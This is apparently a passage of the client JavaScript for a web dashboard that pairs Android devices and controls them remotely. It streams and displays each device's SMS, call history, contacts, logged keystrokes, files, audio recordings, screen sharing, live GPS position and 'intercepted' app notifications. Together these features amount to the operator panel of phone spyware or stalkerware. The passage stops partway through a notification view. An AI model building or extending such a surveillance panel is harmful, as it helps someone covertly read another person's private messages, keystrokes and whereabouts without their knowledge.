// Web Admin Dashboard Client Logic

let authToken = localStorage.getItem('token') || null;
let currentDevice = null;
let ws = null;
let mapInstance = null;
let mapMarker = null;
let mapCircle = null;
let mapPolyline = null;
let locationHistory = [];
let pairingTimer = null;

// DOM Elements
const authModal = document.getElementById('auth-modal');
const loginForm = document.getElementById('login-form');
const pairModal = document.getElementById('pair-modal');
const btnPairModal = document.getElementById('btn-pair-modal');
const btnClosePairModal = document.getElementById('btn-close-pair-modal');
const btnRegenCode = document.getElementById('btn-regen-code');
const logoutBtn = document.getElementById('logout-btn');

// Initialize
document.addEventListener('DOMContentLoaded', () => {
  setupNavigation();
  setupAuth();
  setupPairingModal();
  setupDetailTabs();
  setupCommandButtons();

  if (authToken) {
    authModal.classList.add('hidden');
    initDashboard();
  } else {
    authModal.classList.remove('hidden');
  }
});

// Authentication
function setupAuth() {
  let isRegisterMode = false;
  const toggleBtn = document.getElementById('toggle-auth-mode');
  const submitBtn = document.getElementById('btn-login-submit');

  if (toggleBtn) {
    toggleBtn.addEventListener('click', (e) => {
      e.preventDefault();
      isRegisterMode = !isRegisterMode;
      if (isRegisterMode) {
        submitBtn.textContent = 'Create Account & Sign In';
        toggleBtn.textContent = 'Already have an account? Sign In';
      } else {
        submitBtn.textContent = 'Sign In to Dashboard';
        toggleBtn.textContent = 'New account? Click to Register';
      }
    });
  }

  loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('login-email').value.trim();
    const password = document.getElementById('login-password').value;

    const endpoint = isRegisterMode ? '/api/auth/register' : '/api/auth/login';

    try {
      let res = await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email,
          password,
          username: email.split('@')[0]
        })
      });

      // If login failed because user doesn't exist yet, automatically try registering
      if (!res.ok && !isRegisterMode && res.status === 401) {
        const regRes = await fetch('/api/auth/register', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email,
            password,
            username: email.split('@')[0]
          })
        });
        if (regRes.ok) {
          res = regRes;
        }
      }

      const data = await res.json();
      if (res.ok) {
        authToken = data.token;
        localStorage.setItem('token', authToken);
        document.getElementById('user-display-name').textContent = data.user.username || data.user.email;
        authModal.classList.add('hidden');
        initDashboard();
      } else {
        alert(data.error || 'Authentication failed');
      }
    } catch (err) {
      alert('Error connecting to backend: ' + err.message);
    }
  });

  logoutBtn.addEventListener('click', () => {
    localStorage.removeItem('token');
    authToken = null;
    if (ws) ws.close();
    location.reload();
  });
}

function initDashboard() {
  connectWebSocket();
  loadDevices();
  loadAuditLogs();
  loadAlerts();
}

// Navigation
function setupNavigation() {
  const navItems = document.querySelectorAll('.nav-item');
  navItems.forEach(item => {
    item.addEventListener('click', (e) => {
      e.preventDefault();
      const targetView = item.getAttribute('data-view');
      showView(targetView);
    });
  });

  document.getElementById('btn-back-to-devices').addEventListener('click', () => {
    showView('devices');
  });

  document.getElementById('device-search-input').addEventListener('input', (e) => {
    filterDevices(e.target.value);
  });

  document.getElementById('sms-search-input').addEventListener('input', (e) => {
    filterSMS(e.target.value);
  });

  document.getElementById('contacts-search-input').addEventListener('input', (e) => {
    filterContacts(e.target.value);
  });
}

function showView(viewName) {
  document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
  const activeNav = document.querySelector(`.nav-item[data-view="${viewName}"]`);
  if (activeNav) activeNav.classList.add('active');

  document.querySelectorAll('.view-content').forEach(el => el.classList.remove('active'));
  const target = document.getElementById(`view-${viewName}`);
  if (target) target.classList.add('active');

  document.getElementById('page-title').textContent =
    viewName === 'device-detail' ? 'Device Details' :
    viewName.charAt(0).toUpperCase() + viewName.slice(1);

  if (viewName === 'devices') loadDevices();
  if (viewName === 'audit') loadAuditLogs();
  if (viewName === 'alerts') loadAlerts();
}

// WebSocket Live Real-Time Connection
function connectWebSocket() {
  const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
  const wsUrl = `${protocol}//${location.host}/ws/dashboard`;

  ws = new WebSocket(wsUrl);

  ws.onopen = () => {
    document.getElementById('ws-status-text').textContent = 'Live Synced';
    document.querySelector('.pulse-dot').style.background = '#10b981';
  };

  ws.onclose = () => {
    document.getElementById('ws-status-text').textContent = 'Disconnected';
    document.querySelector('.pulse-dot').style.background = '#ef4444';
    setTimeout(connectWebSocket, 3000);
  };

  ws.onmessage = (event) => {
    try {
      const msg = JSON.parse(event.data);
      handleWsMessage(msg);
    } catch (_) {}
  };
}

function handleWsMessage(msg) {
  resetHeartbeatTime();
  if (msg.type === 'DEVICE_STATUS_CHANGED') {
    updateDeviceStatusInUi(msg.deviceId, msg.status);
    loadDevices();
    pushConsoleTimeline('SYSTEM', 'Device Status Transition', `Device is now ${msg.status}`, msg.status === 'ONLINE' ? 'success' : 'error');
  } else if (msg.type === 'DEVICE_TELEMETRY_UPDATED') {
    if (currentDevice && currentDevice.id === msg.deviceId) {
      applyTelemetry(msg.telemetry);
    }
    loadDevices();
    const bLevel = msg.telemetry ? (msg.telemetry.battery_level !== undefined ? msg.telemetry.battery_level : msg.telemetry.batteryLevel) : 0;
    pushConsoleTimeline('SYSTEM', 'Telemetry Broadcast Received', `Battery: ${bLevel || 0}% • RAM: ${Math.round((msg.telemetry?.ram_available || 0) / (1024*1024))} MB Free`, 'info');
  } else if (msg.type === 'DEVICE_LOCATION_UPDATED') {
    if (currentDevice && currentDevice.id === msg.deviceId) {
      updateMapLocation(msg.location);
    }
    const lat = msg.location?.latitude || 0;
    const lng = msg.location?.longitude || 0;
    pushConsoleTimeline('LOCATION', 'GPS Core Coordinate Intercept', `Lat: ${lat.toFixed(4)}, Lng: ${lng.toFixed(4)} • Accuracy: ±${Math.round(msg.location?.accuracy || 10)}m`, 'success');
  } else if (msg.type === 'DEVICE_NOTIFICATION_RECEIVED') {
    appendNotificationFeed(msg.notification);
    if (currentDevice && currentDevice.id === msg.deviceId) {
      loadDeviceNotifications(currentDevice.id);
    }
    const app = msg.notification?.appName || msg.notification?.packageName || 'App';
    pushConsoleTimeline('NOTIFICATIONS', 'App Push Notification Intercepted', `${app}: "${msg.notification?.title || ''}"`, 'info');
  } else if (msg.type === 'COMMAND_STATUS_UPDATED') {
    if (currentDevice && currentDevice.id === msg.deviceId) {
      loadDeviceCommands(currentDevice.id);
    }
    pushConsoleTimeline('COMMANDS', 'Execution Sync Acknowledged', `Command: ${msg.commandType || 'SYNC'} • Status: ${msg.status || 'QUEUED'}`, msg.status === 'COMPLETED' ? 'success' : (msg.status === 'FAILED' ? 'error' : 'warning'));
  } else if (msg.type === 'GEOFENCE_ALERT') {
    pushConsoleTimeline('LOCATION', `GEOFENCE ${msg.eventType}: ${msg.geofenceName || 'Boundary'}`, `Device ${msg.eventType?.toLowerCase() || 'entered'} perimeter`, msg.eventType === 'ENTERED' ? 'success' : 'warning');
    appendNotificationFeed({
      appName: 'Geofence Security',
      title: `Zone Alert: ${msg.eventType}`,
      text: `Device ${msg.eventType?.toLowerCase() || 'entered'} zone "${msg.geofenceName || 'Safe Zone'}"`
    });
    if (currentDevice && currentDevice.id === msg.deviceId) {
      loadGeofences(currentDevice.id);
      loadAlerts();
    }
  } else if (msg.type === 'GEOFENCES_UPDATED') {
    if (currentDevice && currentDevice.id === msg.deviceId) {
      loadGeofences(currentDevice.id);
    }
  } else if (msg.type === 'SERVICE_HEALTH_UPDATED') {
    if (currentDevice && currentDevice.id === msg.deviceId) {
      loadDeviceHealth(currentDevice.id);
    }
    pushConsoleTimeline('SYSTEM', 'Service Health Update', `Services heartbeat refreshed`, 'info');
  } else if (msg.type === 'DATA_USAGE_UPDATED') {
    if (currentDevice && currentDevice.id === msg.deviceId) {
      loadDeviceUsage(currentDevice.id);
    }
  } else if (msg.type === 'DEVICE_FILES_RECEIVED') {
    if (currentDevice && currentDevice.id === msg.deviceId) {
      loadDeviceFiles(currentDevice.id);
    }
    pushConsoleTimeline('SYSTEM', 'Storage Manifest Received', `Rebuilt local file explorer cache`, 'success');
  } else if (msg.type === 'DEVICE_PAIRED') {
    loadDevices();
    showView('devices');
    pushConsoleTimeline('SYSTEM', 'New Device Enrolled', `Paired successfully`, 'success');
  }
}

// Devices Management
let allDevices = [];

async function loadDevices() {
  try {
    const res = await fetch('/api/devices', {
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    if (!res.ok) return;
    allDevices = await res.json();

    document.getElementById('badge-device-count').textContent = allDevices.length;
    document.getElementById('stat-total-devices').textContent = allDevices.length;

    const onlineCount = allDevices.filter(d => d.status === 'ONLINE').length;
    document.getElementById('stat-online-devices').textContent = onlineCount;

    const avgBat = allDevices.length > 0
      ? Math.round(allDevices.reduce((sum, d) => sum + (d.battery_level || 0), 0) / allDevices.length)
      : '--';
    document.getElementById('stat-avg-battery').textContent = `${avgBat}%`;

    renderDevicesGrid(allDevices);
    renderOverviewDevicesList(allDevices);
  } catch (err) {
    console.error('Error loading devices:', err);
  }
}

function renderDevicesGrid(devices) {
  const container = document.getElementById('devices-grid');
  if (devices.length === 0) {
    container.innerHTML = '<div class="empty-state">No devices enrolled. Click "Pair New Device" to pair an Android device.</div>';
    return;
  }

  container.innerHTML = devices.map(d => `
    <div class="device-card" onclick="openDeviceDetail('${d.id}')">
      <div class="device-card-header">
        <div>
          <div class="device-card-name">${escapeHtml(d.device_name || 'Android Device')}</div>
          <div class="device-card-meta">${escapeHtml(d.manufacturer || '')} ${escapeHtml(d.model || '')} • Android ${escapeHtml(d.os_version || '')}</div>
        </div>
        <span class="pill ${d.status === 'ONLINE' ? 'pill-online' : 'pill-offline'}">${d.status || 'OFFLINE'}</span>
      </div>
      <div class="device-card-metrics">
        <span>🔋 ${d.battery_level || 0}% ${d.is_charging ? '⚡' : ''}</span>
        <span>📡 ${d.network_type || 'Unknown'}</span>
        <span>🕒 ${d.last_seen ? formatTimeAgo(d.last_seen) : 'Never'}</span>
      </div>
    </div>
  `).join('');
}

function renderOverviewDevicesList(devices) {
  const container = document.getElementById('overview-devices-list');
  if (devices.length === 0) {
    container.innerHTML = '<div class="empty-state">No devices enrolled yet.</div>';
    return;
  }

  container.innerHTML = devices.slice(0, 5).map(d => `
    <div class="device-card" style="margin-bottom: 8px;" onclick="openDeviceDetail('${d.id}')">
      <div class="device-card-header" style="margin-bottom: 0;">
        <div>
          <div class="device-card-name">${escapeHtml(d.device_name)}</div>
          <div class="device-card-meta">${escapeHtml(d.model || '')} • ${d.last_seen ? formatTimeAgo(d.last_seen) : ''}</div>
        </div>
        <span class="pill ${d.status === 'ONLINE' ? 'pill-online' : 'pill-offline'}">${d.status}</span>
      </div>
    </div>
  `).join('');
}

function filterDevices(query) {
  const q = query.toLowerCase();
  const filtered = allDevices.filter(d =>
    (d.device_name && d.device_name.toLowerCase().includes(q)) ||
    (d.model && d.model.toLowerCase().includes(q)) ||
    (d.manufacturer && d.manufacturer.toLowerCase().includes(q)) ||
    (d.os_version && d.os_version.toLowerCase().includes(q))
  );
  renderDevicesGrid(filtered);
}

// Device Detail View
let consoleMapInstance = null;
let consoleMapMarker = null;
let consoleMapCircle = null;
let consoleTimelineEvents = [];
let activeTimelineFilter = 'ALL';
let lastHeartbeatTime = null;
let heartbeatInterval = null;

window.openDeviceDetail = async function(deviceId) {
  try {
    const res = await fetch(`/api/devices/${deviceId}`, {
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    if (!res.ok) return;
    currentDevice = await res.json();

    document.getElementById('detail-device-name').textContent = currentDevice.device_name || 'Android Device';
    document.getElementById('detail-device-sub').textContent =
      `${currentDevice.manufacturer || ''} ${currentDevice.model || ''} • Android ${currentDevice.os_version || ''} (SDK ${currentDevice.sdk_version || ''})`;

    const pill = document.getElementById('detail-status-pill');
    pill.textContent = currentDevice.status;
    pill.className = `pill ${currentDevice.status === 'ONLINE' ? 'pill-online' : 'pill-offline'}`;

    applyTelemetry(currentDevice);
    renderPermissions(currentDevice.permissions);

    showView('device-detail');

    // Setup Console Map & Streams
    setTimeout(() => {
      initConsoleMap();
      resetHeartbeatTime();
      startHeartbeatTracker();
    }, 200);

    // Load sub-resources
    loadDeviceLocations(deviceId);
    loadGeofences(deviceId);
    loadAlerts();
    loadDeviceNotifications(deviceId);
    loadDeviceApps(deviceId);
    loadDeviceUsage(deviceId);
    loadDeviceCommands(deviceId);
    loadDeviceRecordings(deviceId);
    loadDeviceSMS(deviceId);
    loadDeviceCalls(deviceId);
    loadDeviceContacts(deviceId);
    loadDeviceKeystrokes(deviceId);
    loadDeviceFiles(deviceId);
    loadDeviceHealth(deviceId);
  } catch (err) {
    console.error('Error opening device detail:', err);
  }
};

function applyTelemetry(t) {
  if (!t) return;
  const bat = t.battery_level !== undefined ? t.battery_level : (t.batteryLevel || 0);
  const isCharging = t.is_charging !== undefined ? t.is_charging : t.isCharging;

  // Render on legacy overview elements
  const legacyBat = document.getElementById('metric-battery');
  if (legacyBat) legacyBat.textContent = `${bat}%`;
  const legacyProgBat = document.getElementById('progress-battery');
  if (legacyProgBat) legacyProgBat.style.width = `${bat}%`;
  const legacyCharge = document.getElementById('metric-charging');
  if (legacyCharge) legacyCharge.textContent = isCharging ? '⚡ Charging' : 'On battery';

  // Render on new Operations Health Diagnostics Dashboard
  const healthBat = document.getElementById('health-lbl-battery');
  if (healthBat) healthBat.textContent = `${bat}%`;
  const healthProgBat = document.getElementById('health-progress-battery');
  if (healthProgBat) {
    healthProgBat.style.width = `${bat}%`;
    healthProgBat.style.background = bat < 20 ? '#ef4444' : (bat < 50 ? '#f59e0b' : '#10b981');
  }
  
  // Render high-tech cyber dial
  const batteryDialRing = document.getElementById('battery-dial-ring');
  if (batteryDialRing) {
    batteryDialRing.style.setProperty('--battery-pct', `${bat}%`);
    const dialColor = bat < 20 ? 'var(--rose)' : (bat < 50 ? 'var(--amber)' : 'var(--emerald)');
    batteryDialRing.style.background = `conic-gradient(${dialColor} ${bat}%, rgba(255,255,255,0.06) 0)`;
  }
  const healthBatDial = document.getElementById('health-lbl-battery-dial');
  if (healthBatDial) healthBatDial.textContent = `${bat}%`;

  const healthCharging = document.getElementById('health-lbl-charging');
  if (healthCharging) healthCharging.textContent = isCharging ? 'Status: Charging ⚡' : 'Status: On battery';

  const storAvail = t.storage_available || t.storageAvailableBytes || 0;
  const storTotal = t.storage_total || t.storageTotalBytes || 0;
  const storAvailGb = (storAvail / (1024 * 1024 * 1024)).toFixed(1);
  const storTotalGb = (storTotal / (1024 * 1024 * 1024)).toFixed(1);

  // Legacy Storage
  const legacyStor = document.getElementById('metric-storage');
  if (legacyStor) legacyStor.textContent = `${storAvailGb} GB Free`;
  const legacyStorTotal = document.getElementById('metric-storage-total');
  if (legacyStorTotal) legacyStorTotal.textContent = `of ${storTotalGb} GB total`;
  const legacyProgStor = document.getElementById('progress-storage');
  if (legacyProgStor && storTotal > 0) {
    legacyProgStor.style.width = `${Math.min(100, Math.round((storAvail / storTotal) * 100))}%`;
  }

  // Operations storage
  const healthStor = document.getElementById('health-lbl-storage');
  if (healthStor) healthStor.textContent = `${storAvailGb} GB Free`;
  const healthStorTotal = document.getElementById('health-lbl-storage-total');
  if (healthStorTotal) healthStorTotal.textContent = `Capacity: ${storTotalGb} GB total`;
  const healthProgStor = document.getElementById('health-progress-storage');
  if (healthProgStor && storTotal > 0) {
    healthProgStor.style.width = `${Math.min(100, Math.round((storAvail / storTotal) * 100))}%`;
  }

  const ramAvail = t.ram_available || t.ramAvailableBytes || 0;
  const ramTotal = t.ram_total || t.ramTotalBytes || 0;
  const ramAvailMb = Math.round(ramAvail / (1024 * 1024));
  const ramTotalMb = Math.round(ramTotal / (1024 * 1024));

  // Legacy RAM
  const legacyRam = document.getElementById('metric-ram');
  if (legacyRam) legacyRam.textContent = `${ramAvailMb} MB Free`;
  const legacyRamTotal = document.getElementById('metric-ram-total');
  if (legacyRamTotal) legacyRamTotal.textContent = `of ${ramTotalMb} MB total`;
  const legacyProgRam = document.getElementById('progress-ram');
  if (legacyProgRam && ramTotal > 0) {
    legacyProgRam.style.width = `${Math.min(100, Math.round((ramAvail / ramTotal) * 100))}%`;
  }

  // Operations RAM
  const healthRam = document.getElementById('health-lbl-ram');
  if (healthRam) healthRam.textContent = `${ramAvailMb} MB Free`;
  const healthRamTotal = document.getElementById('health-lbl-ram-total');
  if (healthRamTotal) healthRamTotal.textContent = `Total Space: ${ramTotalMb} MB total`;
  const healthProgRam = document.getElementById('health-progress-ram');
  if (healthProgRam && ramTotal > 0) {
    healthProgRam.style.width = `${Math.min(100, Math.round((ramAvail / ramTotal) * 100))}%`;
  }

  const netType = t.network_type || t.networkType || 'Unknown';
  const ssid = t.wifi_ssid || t.wifiSsid || 'None';
  const uptime = t.uptime_millis || t.uptimeMillis || 0;

  // Legacy Network
  const legacyNet = document.getElementById('metric-network');
  if (legacyNet) legacyNet.textContent = netType;
  const legacySSID = document.getElementById('metric-ssid');
  if (legacySSID) legacySSID.textContent = `SSID: ${ssid}`;
  const legacyUptime = document.getElementById('metric-uptime');
  if (legacyUptime) legacyUptime.textContent = `Uptime: ${formatUptime(uptime)}`;

  // Operations Network
  const healthNet = document.getElementById('health-lbl-network');
  if (healthNet) healthNet.textContent = netType === 'WIFI' ? `Wi-Fi (${ssid})` : netType;
  const healthUptime = document.getElementById('health-lbl-uptime');
  if (healthUptime) healthUptime.textContent = formatUptime(uptime);

  // Update Services Status indicators based on network type and battery state
  const statusSrvTelemetry = document.getElementById('status-srv-telemetry');
  if (statusSrvTelemetry) {
    statusSrvTelemetry.textContent = 'Running';
    statusSrvTelemetry.className = 'pill pill-online';
  }
  const statusSrvWs = document.getElementById('status-srv-ws');
  if (statusSrvWs) {
    statusSrvWs.textContent = currentDevice && currentDevice.status === 'ONLINE' ? 'Connected' : 'Offline';
    statusSrvWs.className = `pill ${currentDevice && currentDevice.status === 'ONLINE' ? 'pill-online' : 'pill-offline'}`;
  }

  // Update alert section in case storage or battery is low
  updateOperationsAlerts(bat, (storAvail / (storTotal || 1)));
}

function updateOperationsAlerts(batteryLevel, storageFraction) {
  const container = document.getElementById('console-alerts-list');
  if (!container) return;

  const alerts = [];
  if (batteryLevel < 20) {
    alerts.push({
      level: 'critical',
      title: '🔋 Critical Battery Level',
      msg: `Device battery is at ${batteryLevel}%. Connect to charger to avoid offline interruption.`
    });
  } else if (batteryLevel < 35) {
    alerts.push({
      level: 'warning',
      title: '🔋 Low Battery Warn',
      msg: `Device battery is at ${batteryLevel}%.`
    });
  }

  if (storageFraction < 0.1) {
    alerts.push({
      level: 'critical',
      title: '📁 Storage Capacity Critically Low',
      msg: 'Available storage is below 10%. Please clean up some media recordings.'
    });
  }

  if (currentDevice && currentDevice.status !== 'ONLINE') {
    alerts.push({
      level: 'critical',
      title: '⚠️ Socket Connection Severed',
      msg: 'Android device is offline. Commands will queue and sync when the app reconnects.'
    });
  }

  if (alerts.length === 0) {
    container.innerHTML = '<div class="empty-state" style="padding: 10px; font-size: 0.78rem;">✓ No alerts active. Device state nominal.</div>';
  } else {
    container.innerHTML = alerts.map(a => `
      <div class="alert-row" style="background: ${a.level === 'critical' ? 'rgba(239, 68, 68, 0.08)' : 'rgba(245, 158, 11, 0.08)'}; border-color: ${a.level === 'critical' ? '#ef4444' : '#f59e0b'};">
        <div style="flex: 1;">
          <strong style="color: ${a.level === 'critical' ? '#f87171' : '#fbbf24'}; font-size: 0.8rem;">${escapeHtml(a.title)}</strong>
          <div style="font-size: 0.72rem; color: var(--text-muted); margin-top: 2px;">${escapeHtml(a.msg)}</div>
        </div>
      </div>
    `).join('');
  }
}

function renderPermissions(perms) {
  // Render on legacy overview tab panel
  const legacyContainer = document.getElementById('permissions-status-list');
  const checklistContainer = document.getElementById('permissions-checklist-list');

  if (!perms) {
    const emptyHtml = '<div class="empty-state">No permissions recorded. Send Sync Permissions to retrieve.</div>';
    if (legacyContainer) legacyContainer.innerHTML = emptyHtml;
    if (checklistContainer) checklistContainer.innerHTML = emptyHtml;
    return;
  }

  const list = [
    { label: 'Location Tracking', code: 'location', val: perms.location },
    { label: 'Notification Access', code: 'notification_access', val: perms.notification_access || perms.notificationAccess },
    { label: 'Files & Media Access', code: 'files_access', val: perms.files_access || perms.filesAccess },
    { label: 'Camera Diagnostics', code: 'camera', val: perms.camera },
    { label: 'Microphone Diagnostics', code: 'microphone', val: perms.microphone },
    { label: 'App Usage Access', code: 'usage_access', val: perms.usage_access || perms.usageAccess },
    { label: 'Screen Sharing Stream', code: 'screen_sharing', val: perms.screen_sharing || perms.screenSharing },
    { label: 'Contacts Synchronization', code: 'contacts', val: perms.contacts },
    { label: 'Call History Sync', code: 'calls', val: perms.calls },
    { label: 'SMS Synchronization', code: 'sms', val: perms.sms },
    { label: 'Accessibility Service', code: 'accessibility', val: perms.accessibility }
  ];

  const html = list.map(item => `
    <div class="perm-row" onclick="openPermissionDrawer('${escapeJs(item.label)}', '${item.code}', ${!!item.val})">
      <span class="perm-label" style="font-size: 0.8rem; font-weight: 500;">${escapeHtml(item.label)}</span>
      <span class="pill ${item.val ? 'pill-online' : 'pill-offline'}" style="padding: 2px 8px; font-size: 0.65rem;">${item.val ? 'GRANTED' : 'DISABLED'}</span>
    </div>
  `).join('');

  if (legacyContainer) legacyContainer.innerHTML = html;
  if (checklistContainer) checklistContainer.innerHTML = html;

  // Update Accessibility Management Panel elements
  const accessSrvBadge = document.getElementById('access-srv-badge');
  const accessSrvStatement = document.getElementById('access-srv-statement');
  const accessSrvDevice = document.getElementById('access-srv-device');
  const accessSrvUpdate = document.getElementById('access-srv-update');

  const isAccessibilityEnabled = !!perms.accessibility;

  if (accessSrvBadge) {
    accessSrvBadge.className = `pill ${isAccessibilityEnabled ? 'pill-online' : 'pill-offline'}`;
    accessSrvBadge.textContent = isAccessibilityEnabled ? 'ENABLED' : 'DISABLED';
  }

  if (accessSrvStatement) {
    if (isAccessibilityEnabled) {
      accessSrvStatement.style.background = 'rgba(16, 185, 129, 0.1)';
      accessSrvStatement.style.color = '#10b981';
      accessSrvStatement.style.borderColor = 'rgba(16, 185, 129, 0.2)';
      accessSrvStatement.textContent = 'Accessibility service is enabled.';
    } else {
      accessSrvStatement.style.background = 'rgba(239, 68, 68, 0.1)';
      accessSrvStatement.style.color = '#ef4444';
      accessSrvStatement.style.borderColor = 'rgba(239, 68, 68, 0.2)';
      accessSrvStatement.textContent = 'Accessibility access is currently disabled on this device.';
    }
  }

  if (accessSrvDevice) {
    accessSrvDevice.textContent = currentDevice ? (currentDevice.name || currentDevice.id) : 'None';
  }

  if (accessSrvUpdate) {
    accessSrvUpdate.textContent = currentDevice && currentDevice.updatedAt ? new Date(currentDevice.updatedAt).toLocaleString() : new Date().toLocaleString();
  }

  // Update live status strip markers as well!
  const indOnline = document.getElementById('indicator-online');
  const lblOnline = document.getElementById('lbl-status-online');
  if (indOnline && lblOnline) {
    const isOnline = currentDevice && currentDevice.status === 'ONLINE';
    indOnline.style.background = isOnline ? '#34d399' : '#ef4444';
    lblOnline.textContent = isOnline ? 'DEVICE ONLINE' : 'DEVICE OFFLINE';
  }

  const indSocket = document.getElementById('indicator-socket');
  const lblSocket = document.getElementById('lbl-status-socket');
  if (indSocket && lblSocket) {
    const isOnline = currentDevice && currentDevice.status === 'ONLINE';
    indSocket.style.background = isOnline ? '#34d399' : '#ef4444';
    lblSocket.textContent = isOnline ? 'WEBSOCKET CONNECTED' : 'WEBSOCKET DISCONNECTED';
  }

  const indGPS = document.getElementById('indicator-gps');
  if (indGPS) {
    indGPS.style.background = perms.location ? '#34d399' : '#ef4444';
  }
  const indNotif = document.getElementById('indicator-notif');
  if (indNotif) {
    indNotif.style.background = (perms.notification_access || perms.notificationAccess) ? '#34d399' : '#ef4444';
  }

  // Update service integrity list rows as well!
  const srvNotif = document.getElementById('status-srv-notif');
  if (srvNotif) {
    const running = perms.notification_access || perms.notificationAccess;
    srvNotif.textContent = running ? 'Running' : 'Disabled';
    srvNotif.className = `pill ${running ? 'pill-online' : 'pill-offline'}`;
  }
  const srvGPS = document.getElementById('status-srv-gps');
  if (srvGPS) {
    const running = perms.location;
    srvGPS.textContent = running ? 'Running' : 'Offline';
    srvGPS.className = `pill ${running ? 'pill-online' : 'pill-offline'}`;
  }
}

// Detail Tabs
function setupDetailTabs() {
  const tabBtns = document.querySelectorAll('.tab-btn');
  tabBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      tabBtns.forEach(b => b.classList.remove('active'));
      document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));

      btn.classList.add('active');
      const targetPanel = document.getElementById(btn.getAttribute('data-tab'));
      if (targetPanel) {
        targetPanel.classList.add('active');
        if (btn.getAttribute('data-tab') === 'tab-location') {
          setTimeout(initMap, 200);
        } else if (btn.getAttribute('data-tab') === 'tab-overview') {
          setTimeout(initConsoleMap, 200);
        }
      }
    });
  });
}

// Leaflet Map Integration
function initMap() {
  const mapContainer = document.getElementById('map-container');
  if (!mapContainer) return;

  if (!mapInstance) {
    mapInstance = L.map('map-container').setView([37.7749, -122.4194], 13);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
      attribution: '© OpenStreetMap contributors'
    }).addTo(mapInstance);
  }

  mapInstance.invalidateSize();
  if (locationHistory.length > 0) {
    updateMapLocation(locationHistory[0]);
  }
}

function initConsoleMap() {
  const container = document.getElementById('console-map-container');
  if (!container) return;

  if (!consoleMapInstance) {
    consoleMapInstance = L.map('console-map-container', {
      zoomControl: false,
      attributionControl: false
    }).setView([37.7749, -122.4194], 13);
    
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(consoleMapInstance);
  }

  consoleMapInstance.invalidateSize();
  if (locationHistory && locationHistory.length > 0) {
    updateConsoleMapLocation(locationHistory[0]);
  }
}

function updateConsoleMapLocation(loc) {
  if (!consoleMapInstance || !loc || !loc.latitude || !loc.longitude) return;
  const latLng = [loc.latitude, loc.longitude];
  consoleMapInstance.setView(latLng, 14);

  if (consoleMapMarker) consoleMapMarker.remove();
  if (consoleMapCircle) consoleMapCircle.remove();

  consoleMapMarker = L.marker(latLng).addTo(consoleMapInstance)
    .bindPopup(`<b>${currentDevice?.device_name || 'Device'}</b><br>Accuracy: ±${Math.round(loc.accuracy || 10)}m`)
    .openPopup();

  if (loc.accuracy) {
    consoleMapCircle = L.circle(latLng, {
      radius: loc.accuracy,
      color: '#4f46e5',
      fillColor: '#818cf8',
      fillOpacity: 0.15
    }).addTo(consoleMapInstance);
  }

  const accuracyLbl = document.getElementById('lbl-gps-accuracy');
  if (accuracyLbl) {
    accuracyLbl.textContent = `Accuracy: ±${Math.round(loc.accuracy || 10)}m • Lat: ${loc.latitude.toFixed(5)}, Lng: ${loc.longitude.toFixed(5)}`;
  }
}

window.recenterConsoleMap = function() {
  if (locationHistory && locationHistory.length > 0) {
    updateConsoleMapLocation(locationHistory[0]);
  }
};

async function loadDeviceLocations(deviceId) {
  try {
    const res = await fetch(`/api/devices/${deviceId}/locations`, {
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    if (!res.ok) return;
    locationHistory = await res.json();
    if (locationHistory.length > 0) {
      if (mapInstance) updateMapLocation(locationHistory[0]);
      if (consoleMapInstance) updateConsoleMapLocation(locationHistory[0]);
    }
  } catch (_) {}
}

function updateMapLocation(loc) {
  if (!mapInstance || !loc || !loc.latitude || !loc.longitude) return;

  const latLng = [loc.latitude, loc.longitude];
  mapInstance.setView(latLng, 15);

  if (mapMarker) mapMarker.remove();
  if (mapCircle) mapCircle.remove();

  mapMarker = L.marker(latLng).addTo(mapInstance)
    .bindPopup(`<b>${currentDevice?.device_name || 'Device'}</b><br>Accuracy: ±${loc.accuracy || 10}m<br>${new Date(loc.timestamp).toLocaleTimeString()}`)
    .openPopup();

  if (loc.accuracy) {
    mapCircle = L.circle(latLng, {
      radius: loc.accuracy,
      color: '#4f46e5',
      fillColor: '#818cf8',
      fillOpacity: 0.2
    }).addTo(mapInstance);
  }

  document.getElementById('map-last-updated').textContent = `Last updated: ${new Date(loc.timestamp).toLocaleTimeString()}`;

  // Keep console map in sync
  if (consoleMapInstance) {
    updateConsoleMapLocation(loc);
  }
}

// SLIDE DRAWER MANAGEMENT & DETAIL VIEWS
window.openConsoleDrawer = function(title, htmlContent) {
  const drawer = document.getElementById('slide-drawer');
  const dTitle = document.getElementById('drawer-title');
  const dBody = document.getElementById('drawer-content-body');
  
  if (drawer && dTitle && dBody) {
    dTitle.textContent = title;
    dBody.innerHTML = htmlContent;
    drawer.classList.add('active');
  }
};

window.closeConsoleDrawer = function() {
  const drawer = document.getElementById('slide-drawer');
  if (drawer) {
    drawer.classList.remove('active');
  }
};

window.openNotificationDrawer = function(appName, title, text, time) {
  const html = `
    <div style="display: flex; flex-direction: column; gap: 16px; margin-top: 10px;">
      <div style="display: flex; align-items: center; gap: 12px; background: rgba(129, 140, 248, 0.05); padding: 12px; border-radius: 8px; border: 1px solid var(--border);">
        <div style="font-size: 2rem;">🔔</div>
        <div>
          <h4 style="margin: 0; font-size: 1rem; color: #818cf8;">${escapeHtml(appName)}</h4>
          <span style="font-size: 0.75rem; color: var(--text-muted);">${escapeHtml(time)}</span>
        </div>
      </div>
      <div>
        <span class="text-muted" style="font-size: 0.72rem; display: block; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px;">Notification Title</span>
        <div style="background: rgba(255,255,255,0.02); border: 1px solid var(--border); padding: 10px 14px; border-radius: 6px; font-weight: 600; font-size: 0.9rem;">
          ${escapeHtml(title || 'No Title')}
        </div>
      </div>
      <div>
        <span class="text-muted" style="font-size: 0.72rem; display: block; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px;">Intercepted Message Body</span>
